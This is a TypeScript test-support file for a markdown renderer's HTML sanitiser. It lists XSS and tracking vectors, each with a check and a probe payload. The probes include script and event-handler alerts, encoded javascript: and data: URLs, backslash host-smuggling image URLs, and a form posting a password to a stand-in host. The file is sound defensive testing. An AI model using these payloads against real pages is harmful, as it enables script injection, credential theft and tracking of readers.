// The forbidden vectors, as checks over rendered HTML (ADR-0009). Test support: no `node:` imports
// and no assertion library, so the same checks can run in a browser-side gate as easily as in a test.
//
// Every vector carries a `probe` — markdown that trips it when nothing sanitises the render — so the
// suite can prove each check is capable of failing. A sanitiser test suite that passes against a
// sanitiser that does nothing is worse than no suite at all.

import { BLOCK_ELEMENTS, DEFAULT_POLICY, PROVENANCE_ATTRIBUTES, VOID_ELEMENTS, type Policy } from '../policy.ts';
import { decodeReferences } from '../escape.ts';

export interface Attribute {
  /** Lowercased element name the attribute was found on. */
  readonly element: string;
  /** Lowercased attribute name, exactly as it was spelled otherwise. */
  readonly name: string;
  readonly raw: string;
  /** The value with character references resolved, twice, which is what a second parse would see. */
  readonly decoded: string;
}

export interface Vector {
  readonly id: string;
  /** Why this vector matters, in one line, for the failure message. */
  readonly why: string;
  /** Markdown that trips `check` when the render is not sanitised. */
  readonly probe: string;
  /**
   * HTML that trips `check`, for a vector markdown cannot express — CommonMark's raw-HTML tag names
   * have no colon, so a namespaced element can only ever arrive as a string at the sanitiser's door.
   */
  readonly probeHtml?: string;
  /** Throws if the HTML violates the vector. */
  readonly check: (html: string, policy?: Policy) => void;
}

const TAG = /<([A-Za-z][^\s/>]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;
const ATTRIBUTE = /([^\s=/>]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g;

/** Element names present in the HTML, lowercased, in document order. */
export function elementsOf(html: string): string[] {
  const names: string[] = [];
  for (const match of html.matchAll(TAG)) names.push(match[1]!.toLowerCase());
  return names;
}

export function attributesOf(html: string): Attribute[] {
  const attributes: Attribute[] = [];
  for (const tag of html.matchAll(TAG)) {
    const element = tag[1]!.toLowerCase();
    for (const found of (tag[2] ?? '').matchAll(ATTRIBUTE)) {
      const raw = found[2] ?? found[3] ?? found[4] ?? '';
      attributes.push({
        element,
        name: found[1]!.toLowerCase(),
        raw,
        decoded: decodeReferences(decodeReferences(raw)),
      });
    }
  }
  return attributes;
}

/** An end offset no corpus document reaches, so a forged pair is recognisable wherever it lands. */
const FORGED_END = '987654321';
const PROVENANCE_NAMES: readonly string[] = [PROVENANCE_ATTRIBUTES.start, PROVENANCE_ATTRIBUTES.end];

function fail(id: string, detail: string): never {
  throw new Error(`${id}: ${detail}`);
}

/** Values that fetch or execute on their own, wherever they appear. */
const FETCHING_ATTRIBUTES = [
  'src', 'srcset', 'poster', 'data', 'background', 'action', 'formaction', 'srcdoc', 'ping',
  'xlink:href', 'lowsrc', 'dynsrc', 'codebase', 'cite', 'profile', 'manifest', 'imagesrcset',
];

/**
 * Every attribute a URL can be *used* from, which is the set a scheme may be judged in. Wider than
 * the list above on purpose, and deliberately not read from the policy. A scheme in a value the
 * browser never dereferences is prose — a README about XSS may say `javascript:alert(1)` in an
 * `alt`, and a check that failed on that would be teaching the sanitiser to damage documents.
 */
const URL_ATTRIBUTES = [...FETCHING_ATTRIBUTES, 'href', 'longdesc', 'usemap', 'icon', 'style'];

/**
 * Resolution, written here a second time on purpose.
 *
 * `urls.ts` decides what a value addresses; if these checks asked it, they would agree with it by
 * construction and could never catch it being wrong — which is exactly how `/\evil.example/p.png`
 * passed 27 vectors while fetching from `evil.example` in both engines. These bases differ from the
 * sanitiser's, and the question asked is the plainest one available: resolve against two bases, and
 * if the answer is the same, the value brought its own authority.
 */
const CHECK_BASES = ['https://one.check.invalid/here/', 'https://two.check.invalid/here/'] as const;

function resolve(value: string): URL | undefined {
  try {
    return new URL(value.replace(/[\t\n\r]/g, '').trim(), CHECK_BASES[0]);
  } catch {
    return undefined;
  }
}

function schemeOf(value: string): string | undefined {
  const here = resolve(value);
  if (here === undefined) return undefined;
  let there: URL;
  try {
    there = new URL(value.replace(/[\t\n\r]/g, '').trim(), CHECK_BASES[1]);
  } catch {
    return undefined;
  }
  return here.href === there.href ? here.protocol.slice(0, -1).toLowerCase() : undefined;
}

/** Remote means: addresses an authority that is not the document's own, however it is spelled. */
function isRemote(value: string): boolean {
  return schemeOf(value) !== undefined;
}

/** An element must not appear at all, with its subtree. */
function absentElement(id: string, why: string, probe: string, names: readonly string[]): Vector {
  return {
    id,
    why,
    probe,
    check: (html) => {
      const present = elementsOf(html).filter((name) => names.includes(name));
      if (present.length > 0) fail(id, `found ${present.length} ${present.join(', ')} element(s); ${why}`);
    },
  };
}

/** An attribute must not appear on any element. */
function absentAttribute(id: string, why: string, probe: string, match: (name: string) => boolean): Vector {
  return {
    id,
    why,
    probe,
    check: (html) => {
      const present = attributesOf(html).filter((attribute) => match(attribute.name));
      if (present.length > 0) {
        fail(id, `found ${present.map((a) => `${a.element}[${a.name}]`).join(', ')}; ${why}`);
      }
    },
  };
}

/**
 * The vectors. The first six are the story's acceptance criterion in its own words; the rest are the
 * ones the criterion does not name and an attacker would reach for first.
 */
export const VECTORS: readonly Vector[] = [
  absentElement(
    'no-script-element',
    'a script element is arbitrary code running with the reader\'s document',
    "<script>alert('xss')</script>\n",
    ['script'],
  ),
  absentElement(
    'no-iframe-element',
    'an iframe fetches and renders a document nobody asked for',
    '<iframe src="https://vector.invalid/track" srcdoc="<script>alert(1)</script>"></iframe>\n',
    ['iframe', 'frame', 'frameset'],
  ),
  absentElement(
    'no-object-or-embed-element',
    'object and embed load a plug-in document from wherever they point',
    '<object data="https://vector.invalid/o.swf"></object>\n\n<embed src="https://vector.invalid/e.swf">\n',
    ['object', 'embed', 'applet', 'param'],
  ),
  {
    id: 'no-form-element-or-control',
    why: 'a form posts what a reader types to whoever wrote the document, and an input that is not a checkbox is a field they can type in',
    probe: '<form action="https://vector.invalid/steal"><input name="pw" type="password"><textarea></textarea><select></select><button formaction="https://vector.invalid/f">Send</button></form>\n\n<input type="text" name="loose">\n',
    check: (html) => {
      const controls = ['form', 'textarea', 'select', 'option', 'button', 'fieldset', 'label', 'output'];
      const present = elementsOf(html).filter((name) => controls.includes(name));
      if (present.length > 0) fail('no-form-element-or-control', `found ${present.join(', ')}`);
      // The GFM task marker is the one input a document may have, and only as a checkbox.
      for (const tag of html.matchAll(TAG)) {
        if (tag[1]!.toLowerCase() !== 'input') continue;
        const type = attributesOf(tag[0]).find((attribute) => attribute.name === 'type');
        if (type?.decoded.trim().toLowerCase() !== 'checkbox') {
          fail('no-form-element-or-control', `an input of type ${type?.decoded ?? '(absent)'} is a field a reader can type in`);
        }
      }
    },
  },
  absentElement(
    'no-meta-element',
    'a meta refresh navigates the reader somewhere on its own',
    '<meta http-equiv="refresh" content="0;url=https://vector.invalid/phish">\n',
    ['meta'],
  ),
  absentElement(
    'no-link-element',
    'a link element fetches a stylesheet, a preload or a prefetch, which is a request either way',
    '<link rel="stylesheet" href="https://vector.invalid/theme.css">\n\n<link rel="preload" as="image" href="https://vector.invalid/p.png">\n\n<link rel="prefetch" href="https://vector.invalid/n.html">\n',
    ['link'],
  ),
  absentElement(
    'no-style-element',
    'a style element can fetch through @import or url() and can restyle the reader\'s window',
    '<style>@import url(https://vector.invalid/i.css); body { background: url(https://vector.invalid/b.gif) }</style>\n',
    ['style'],
  ),
  absentElement(
    'no-base-element',
    'a base element re-points every relative reference in the document at another host',
    '<base href="https://vector.invalid/">\n',
    ['base'],
  ),
  absentElement(
    'no-template-element',
    'template content is inert to a sanitiser that walks rendered nodes and live the moment it is cloned',
    '<template><img src="https://vector.invalid/t.png"><script>alert(1)</script></template>\n',
    ['template', 'noscript', 'noembed', 'noframes', 'xmp', 'plaintext', 'listing'],
  ),
  absentElement(
    'no-svg',
    'SVG carries its own script, its own fetch (use, image) and its own animation triggers',
    '<svg onload="alert(1)"><script>alert(2)</script><use href="https://vector.invalid/u.svg#i" /><image href="https://vector.invalid/i.png" /><animate onbegin="alert(3)" attributeName="x" /><set onbegin="alert(4)" /><foreignObject><p>x</p></foreignObject></svg>\n',
    ['svg', 'script', 'use', 'image', 'animate', 'animatetransform', 'set', 'foreignobject'],
  ),
  absentElement(
    'no-mathml',
    'MathML has its own attributes that fetch and its own event handlers',
    '<math><maction actiontype="statusline#https://vector.invalid/m" xlink:href="javascript:alert(1)">x</maction><mtext><style>@import url(https://vector.invalid/m.css)</style></mtext></math>\n',
    ['math', 'maction', 'mtext', 'mglyph', 'semantics', 'annotation-xml'],
  ),
  absentElement(
    'no-media-element',
    'audio, video, source and track each fetch on their own, and a poster is a tracking pixel with a name',
    '<video poster="https://vector.invalid/p.jpg" src="https://vector.invalid/v.mp4"><source src="https://vector.invalid/s.mp4"><track src="https://vector.invalid/t.vtt"></video>\n\n<audio src="https://vector.invalid/a.mp3"></audio>\n\n<picture><source srcset="https://vector.invalid/w.webp"></picture>\n',
    ['video', 'audio', 'source', 'track'],
  ),
  {
    id: 'no-namespaced-element',
    why: 'a namespaced name is a way to be a script to the parser and something else to a sanitiser',
    probe: '<svg:script>alert(1)</svg:script>\n\n<xhtml:a href="javascript:alert(2)">x</xhtml:a>\n\n<a:b onclick="alert(3)">y</a:b>\n',
    probeHtml: '<svg:script>alert(1)</svg:script><xhtml:a href="javascript:alert(2)">x</xhtml:a><a:b onclick="alert(3)">y</a:b>',
    check: (html) => {
      const namespaced = elementsOf(html).filter((name) => name.includes(':'));
      if (namespaced.length > 0) fail('no-namespaced-element', `found ${namespaced.join(', ')}`);
    },
  },
  absentAttribute(
    'no-event-handler-attribute',
    'an on* attribute is script, however it is spelled or cased',
    // Every handler a policy edit might plausibly wave through, not only the ones a sanitiser
    // usually forgets: `onclick` on a `p` passed the earlier suite because no probe contained it.
    [
      '<p OnMouseOver="alert(1)" onerror=alert(2) ONLOAD=\'alert(3)\' onFocus="alert(4)">x</p>',
      '',
      '<p onclick="alert(5)" ondblclick="alert(6)" onauxclick="alert(7)" oncontextmenu="alert(8)">y</p>',
      '',
      '<p onanimationstart="alert(9)" ontransitionend="alert(10)" onscroll="alert(11)" ontoggle="alert(12)">z</p>',
      '',
      '<p oncopy="alert(13)" oncut="alert(14)" onpaste="alert(15)" onwheel="alert(16)" onpointerdown="alert(17)">w</p>',
      '',
      '<img src=x onerror="alert(18)">',
      '',
      '<a href="#a" onmouseenter="alert(19)" onbeforetoggle="alert(20)" onfocusin="alert(21)">v</a>',
      '',
    ].join('\n'),
    (name) => name.startsWith('on'),
  ),
  absentAttribute(
    'no-style-attribute',
    'a style attribute can carry url() and fetch from it',
    '<div style="background:url(https://vector.invalid/beacon.gif)">styled</div>\n\n<p style="behavior:url(#x)">y</p>\n',
    (name) => name === 'style',
  ),
  absentAttribute(
    'no-srcdoc-or-formaction',
    'srcdoc is a whole document in an attribute and formaction re-targets a submission',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>\n\n<button formaction="https://vector.invalid/f">go</button>\n',
    (name) => name === 'srcdoc' || name === 'formaction',
  ),
  absentAttribute(
    'no-srcset-or-poster',
    'srcset and poster fetch exactly like src and are forgotten exactly as often',
    '<img src="local.png" srcset="https://vector.invalid/2x.png 2x">\n\n<video poster="https://vector.invalid/p.jpg"></video>\n',
    (name) => name === 'srcset' || name === 'imagesrcset' || name === 'poster',
  ),
  absentAttribute(
    'no-xlink-href',
    'xlink:href is a second spelling of href that predates most sanitisers',
    '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>\n',
    (name) => name === 'xlink:href' || name === 'xmlns:xlink',
  ),
  {
    id: 'no-javascript-or-data-url',
    why: 'a javascript: or data: target executes in the reader\'s document',
    probe: [
      '[markdown javascript link](javascript:alert(1))',
      '',
      '[markdown data link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
      '',
      '<a href="JaVaScRiPt:alert(2)">cased</a>',
      '',
      '<a href="java\tscript:alert(3)">tabbed</a>',
      '',
      '<a href="&#106;avascript&colon;alert(4)">referenced</a>',
      '',
      '<a href="&amp;#106;avascript:alert(5)">doubly referenced</a>',
      '',
      '<a href="vbscript:msgbox(6)">vbscript</a>',
      '',
      '![data image](data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+)',
      '',
    ].join('\n'),
    check: (html) => {
      const denied = new Set(['javascript', 'data', 'vbscript', 'jscript', 'livescript', 'blob', 'filesystem', 'view-source']);
      for (const attribute of attributesOf(html)) {
        if (!URL_ATTRIBUTES.includes(attribute.name)) continue;
        for (const value of [attribute.raw, attribute.decoded]) {
          const scheme = schemeOf(value);
          if (scheme !== undefined && denied.has(scheme)) {
            fail('no-javascript-or-data-url', `${attribute.element}[${attribute.name}] carries ${scheme}:`);
          }
        }
      }
    },
  },
  {
    id: 'no-remote-subresource',
    why: 'a fetched subresource tells whoever hosts it that this document was opened, which is the read receipt AGENTS.md forbids',
    probe: [
      '![remote image](https://vector.invalid/remote.png)',
      '',
      '![tracking pixel](https://vector.invalid/pixel.gif?doc=hostile)',
      '',
      '<img src="//vector.invalid/scheme-relative.gif">',
      '',
      '<img src="HTTPS://VECTOR.INVALID/cased.gif">',
      '',
      '<img src="https:/\\/\\vector.invalid/slashes.gif">',
      '',
      // A URL parser reads `/\` as `//` under a special scheme, so these five all name a host while
      // looking like a path. The first of them fetched from `evil.example` in both engines.
      '<img src="/\\vector.invalid/backslash.png">',
      '',
      '<img src="/&bsol;vector.invalid/entity.png">',
      '',
      '<img src="/&#x5c;vector.invalid/numeric.png">',
      '',
      '<img src="\\\\vector.invalid/unc.png">',
      '',
      '<img src="http:\\\\vector.invalid/scheme-backslash.png">',
      '',
    ].join('\n'),
    check: (html) => {
      for (const attribute of attributesOf(html)) {
        if (!FETCHING_ATTRIBUTES.includes(attribute.name)) continue;
        for (const value of [attribute.raw, attribute.decoded]) {
          if (isRemote(value)) {
            fail('no-remote-subresource', `${attribute.element}[${attribute.name}] points at ${value.slice(0, 60)}`);
          }
        }
      }
    },
  },
  {
    id: 'no-url-function-or-import',
    why: '@import and url() are how a stylesheet fetches, and a theme may not make a request (AGENTS.md)',
    probe: '<div style="background:url(https://vector.invalid/b.gif)">x</div>\n\n<p style="@import url(https://vector.invalid/i.css)">y</p>\n',
    check: (html) => {
      for (const attribute of attributesOf(html)) {
        if (/url\s*\(|@import/i.test(attribute.decoded)) {
          fail('no-url-function-or-import', `${attribute.element}[${attribute.name}] carries a stylesheet fetch`);
        }
      }
    },
  },
  {
    id: 'no-comment-or-declaration',
    why: 'a comment hides markup from the reader and from any check that reads the visible text',
    probe: '<!-- comment that must not leak -->\n\n<!doctype html>\n\n<![CDATA[<script>alert(1)</script>]]>\n\n<?php echo 1; ?>\n',
    check: (html) => {
      if (html.includes('<!--') || html.includes('<!') || html.includes('<?')) {
        fail('no-comment-or-declaration', 'a comment, a declaration or a processing instruction survived');
      }
    },
  },
  {
    id: 'every-element-is-allow-listed',
    why: 'default-deny: the element nobody thought of is the one that matters, so membership is the check',
    probe: '<custom-element data-x="1">text</custom-element>\n\n<keygen>\n\n<marquee behavior="scroll">y</marquee>\n\n<isindex action="https://vector.invalid/i">\n',
    check: (html, policy = DEFAULT_POLICY) => {
      const unknown = [...new Set(elementsOf(html))].filter((name) => policy.elements[name] === undefined);
      if (unknown.length > 0) fail('every-element-is-allow-listed', `not in the ${policy.name} allow-list: ${unknown.join(', ')}`);
    },
  },
  {
    id: 'every-attribute-is-allow-listed',
    why: 'the same rule one level down: an attribute reaches the DOM because it was named, not because it looked harmless',
    probe: '<p data-tracking="1" contenteditable="true" autofocus tabindex="1" srcset="https://vector.invalid/a.png" is="x-evil">text</p>\n',
    check: (html, policy = DEFAULT_POLICY) => {
      const offenders = attributesOf(html).filter((attribute) => {
        const rule = policy.elements[attribute.element]?.attributes?.[attribute.name] ?? policy.globalAttributes[attribute.name];
        return rule === undefined;
      });
      if (offenders.length > 0) {
        fail('every-attribute-is-allow-listed', `not in the ${policy.name} allow-list: ${offenders.map((a) => `${a.element}[${a.name}]`).join(', ')}`);
      }
    },
  },
  {
    id: 'every-value-survives-a-second-decoding',
    why: 'a value can be innocent after one decoding pass and dangerous after another; the output must be safe in both readings',
    probe: '<a href="&amp;#106;avascript:alert(1)">x</a>\n\n<a href="&amp;#x6a;avascript&amp;colon;alert(2)">y</a>\n\n<img src="&amp;#104;ttps://vector.invalid/p.png">\n',
    check: (html) => {
      for (const attribute of attributesOf(html)) {
        if (attribute.decoded === attribute.raw) continue;
        const scheme = schemeOf(attribute.decoded);
        if (scheme !== undefined && !['http', 'https', 'mailto'].includes(scheme)) {
          fail('every-value-survives-a-second-decoding', `${attribute.element}[${attribute.name}] becomes ${scheme}: when decoded again`);
        }
        if (FETCHING_ATTRIBUTES.includes(attribute.name) && isRemote(attribute.decoded)) {
          fail('every-value-survives-a-second-decoding', `${attribute.element}[${attribute.name}] becomes remote when decoded again`);
        }
      }
    },
  },
  {
    id: 'no-resurrected-raw-text',
    why: 'text a parser keeps inside an element must not come out of the sanitiser as markup: a smuggled img makes the reader fetch a file the document never asked for',
    // Every one of these is inert in WebKit and Chromium — the elements after the first tag are
    // text, not markup, so the sanitiser must remove them with it. `plaintext` never ends at all,
    // `listing` is parsed as markup like `pre`, and a `<script>` that has entered its escaped state
    // keeps a `</script>` for itself. The sentinel is in the name: if `resurrected.png` reaches the
    // output, the sanitiser built an element the browser would not have.
    // `plaintext` comes last on purpose: nothing ends it, so everything after it is inside it in
    // the engine's parse as well as in the removal, and a case written below it would check
    // nothing. One sentinel per case for the same reason — two cases sharing a filename would let
    // a resurrected image in one be excused by a legitimately live image in another.
    probe: [
      '<style></style foo="><img src="resurrected-endtag.png" alt="e">"><img src="kept-endtag.png" alt="k">',
      '',
      '<listing><b title="</listing>">smuggled</b><img src="resurrected-listing.png" alt="l">',
      '',
      '<script><!--<script>a</script><img src="resurrected-script.png" alt="s"></script>',
      '',
      '<plaintext>hidden</plaintext><img src="resurrected-plaintext.png" alt="p">',
      '',
    ].join('\n'),
    // The same cases as HTML, because two of them cannot survive markdown: an end tag delimited by
    // a form feed is not a tag to CommonMark, which escapes it into text the sanitiser then never
    // sees as an end tag at all.
    // Ordered by how much each one consumes, so that no case hides the next: the three that end
    // where the engine ends them come first, and the one that never ends comes last.
    probeHtml: [
      '<xmp></xmp\f><img src="kept.png" alt="x">',
      // An end tag carries attributes, so a `>` inside a quoted value on one does not end it. The
      // engine builds one image here; ending the scan at the first `>` builds two, and the second
      // one is fetched.
      '<style></style foo="><img src="resurrected-endtag.png" alt="e">"><img src="kept-endtag.png" alt="k">',
      '<script><!--<script>a</script><img src="resurrected-script.png" alt="s"></script>',
      '<listing><b title="</listing>">smuggled</b><img src="resurrected-listing.png" alt="l"></listing>',
      '<plaintext>hidden</plaintext><img src="resurrected-plaintext.png" alt="p">',
    ].join(''),
    check: (html) => {
      const raw = ['plaintext', 'listing', 'xmp', 'script', 'style', 'title', 'textarea', 'iframe', 'noembed', 'noframes', 'noscript'];
      const present = elementsOf(html).filter((name) => raw.includes(name));
      if (present.length > 0) fail('no-resurrected-raw-text', `found ${present.join(', ')}`);
      for (const attribute of attributesOf(html)) {
        for (const value of [attribute.raw, attribute.decoded]) {
          if (value.includes('resurrected')) {
            fail('no-resurrected-raw-text', `${attribute.element}[${attribute.name}] came out of a removed element as markup`);
          }
        }
      }
    },
  },
  {
    id: 'output-tree-is-balanced',
    why: 'an element left open swallows whatever the reader sees next, so the tree the sanitiser emits must be the tree it decided on',
    // A solidus on a non-void HTML element is ignored by every parser, so `<a href="…" />` opens an
    // anchor — which, unclosed, made the rest of a document a link to the author's host in both
    // engines. The check may not skip a tag because it ends in `/`; only a void element may.
    // Each raw tag is a block of its own, which is the shape that swallowed a document: an inline
    // one is closed by the paragraph's own end tag and proves nothing.
    probe: [
      '<a href="https://vector.invalid/" />',
      '',
      'ordinary prose after a self-closed anchor',
      '',
      '<blockquote />',
      '',
      'prose that is not a quotation',
      '',
      '<a/href="https://vector.invalid/" title="z" />',
      '',
      '<b>',
      '',
      'unclosed',
      '',
      '</em></p></div>',
      '',
    ].join('\n'),
    check: (html) => treeOf(html, 'output-tree-is-balanced'),
  },
  {
    id: 'provenance-forgery',
    why: 'a document that writes its own data-marxy-s/e points an operation at bytes the reader never selected, which is the one thing marxy promises never to do (ADR-0023)',
    // Raw HTML only, so the render has no element of its own: any provenance in the output is forged.
    // One block and one inline island, and a start past any real document, so a forged pair can
    // never collide with a real one by accident.
    probe: [
      `<p data-marxy-s="0" data-marxy-e="${FORGED_END}">forged block</p>`,
      '',
      `inline <kbd DATA-MARXY-S="0" data-marxy-e='${FORGED_END}'>forged</kbd> and <b data-marxy-x="1">stray</b>`,
      '',
    ].join('\n'),
    check: (html) => {
      const forged = attributesOf(html).filter(
        (attribute) => attribute.name.startsWith('data-marxy-') && (attribute.decoded === FORGED_END || !PROVENANCE_NAMES.includes(attribute.name)),
      );
      if (forged.length > 0) {
        fail('provenance-forgery', `a document's own provenance survived: ${forged.map((a) => `${a.element}[${a.name}="${a.raw}"]`).join(', ')}`);
      }
    },
  },
  {
    id: 'no-formatting-element-spanning-a-block',
    why: 'an anchor that reaches past the paragraph it started in turns the rest of the document into a link, which is a read receipt the moment the reader clicks anything',
    probe: '<a href="https://vector.invalid/" />\n\npara\n\n## heading\n\nmore prose\n',
    check: (html) => {
      const stack = treeOf(html, 'no-formatting-element-spanning-a-block');
      for (const { name, ancestors } of stack) {
        if (!BLOCK_ELEMENTS.has(name)) continue;
        const formatting = ancestors.find((ancestor) => !BLOCK_ELEMENTS.has(ancestor));
        if (formatting !== undefined) {
          fail('no-formatting-element-spanning-a-block', `<${name}> sits inside <${formatting}>`);
        }
      }
    },
  },
];

/**
 * Walks the output as a tree, failing if it is not one: every element closed, in order, nothing
 * closing what was never opened. Returns each element with its ancestors so a second check can ask
 * about containment. Written against what a parser does with a solidus, not against what the
 * sanitiser believes about it.
 */
function treeOf(html: string, id: string): { name: string; ancestors: string[] }[] {
  const open: string[] = [];
  const seen: { name: string; ancestors: string[] }[] = [];
  for (const match of html.matchAll(/<(\/?)([A-Za-z][^\s/>]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g)) {
    const name = match[2]!.toLowerCase();
    if (match[1] === '/') {
      const at = open.lastIndexOf(name);
      if (at === -1) fail(id, `</${name}> closes nothing`);
      if (at !== open.length - 1) fail(id, `</${name}> closes across ${open.slice(at + 1).join(', ')}`);
      open.length = at;
      continue;
    }
    seen.push({ name, ancestors: [...open] });
    if (VOID_ELEMENTS.has(name)) continue;
    open.push(name);
  }
  if (open.length > 0) fail(id, `left open: ${open.join(', ')}`);
  return seen;
}

/** Runs every vector, collecting failures so one run names all of them. */
export function checkAllVectors(html: string, policy: Policy = DEFAULT_POLICY): string[] {
  const failures: string[] = [];
  for (const vector of VECTORS) {
    try {
      vector.check(html, policy);
    } catch (error) {
      failures.push(error instanceof Error ? error.message : String(error));
    }
  }
  return failures;
}
